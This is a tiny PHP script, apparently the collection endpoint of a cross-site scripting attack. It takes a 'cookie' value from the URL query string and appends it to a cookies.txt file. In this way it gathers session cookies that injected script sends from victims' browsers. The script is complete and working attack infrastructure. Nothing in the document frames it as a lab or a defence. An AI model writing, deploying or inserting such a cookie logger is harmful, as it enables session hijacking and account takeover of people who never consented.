<?php

$cookie = $_GET['cookie'];
$file = fopen('cookies.txt', 'a');
fwrite($file, $cookie . "\n");

?>